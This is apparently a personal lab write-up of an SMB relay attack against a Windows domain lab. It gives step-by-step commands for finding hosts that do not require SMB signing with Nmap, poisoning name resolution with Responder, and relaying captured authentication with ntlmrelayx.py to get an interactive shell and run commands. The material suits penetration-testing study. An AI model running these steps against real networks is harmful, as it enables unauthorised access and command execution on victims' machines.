## SMB Relay Attacks Lab

### Identify Hosts with Nmap
- Run Nmap `nmap --script=smb2-security-mode.nse -p445 <DC IP>`
- Use `-Pn` to skip ping if it's blocked

  ![image](https://github.com/user-attachments/assets/9eba0cbf-a8f7-47a9-96ba-230cb12a9ffa)

- DC has message signing enabled and required
- Can't relay to DC, womp womp
- Sweep the network with `0/24`
- Both workstations have SMB signing enabled but not required, what we want

  ![image](https://github.com/user-attachments/assets/7fc5a7d5-4683-484c-bf07-61e58b83b15c)

  ![image](https://github.com/user-attachments/assets/4274f204-79a0-4123-b5d7-45f259d77ff8)

- Add workstation IPs to targets.txt

### Responder
- Change the config `sudo vim /etc/responder/Responder.conf` to turn off SMB and HTTP
- Run responder `sudo responder -I eth0 -dwv`

### Run SMB Relay
- Run SMB Relay `ntlmrelayx.py -tf targets.txt -smb2support -i`

### Event
- Point victim on domain to attacker by navigating to `\\<IP>` in File Explorer`

### Bind to Shell
- SMB Relay successfully authenticates to other machine

  ![image](https://github.com/user-attachments/assets/e02a981c-bd4e-4c81-bd76-fd3dec085601)

- Use netcat: `nc 127.0.0.1 11000` to bind to port

  ![image](https://github.com/user-attachments/assets/90145aff-6e76-4244-8dc4-adc7953803c1)

### PoC
- Run SMB Relay `ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"`

  ![Screenshot 2025-02-02 215254](https://github.com/user-attachments/assets/0f613f24-fffe-4030-bf73-cb565078984a)
  
